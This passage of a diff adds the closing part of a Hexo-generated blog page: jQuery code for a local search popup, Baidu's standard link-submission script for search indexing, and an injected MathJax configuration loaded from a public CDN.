+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+
+  
+
+  
+
+</div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end --></body></html>
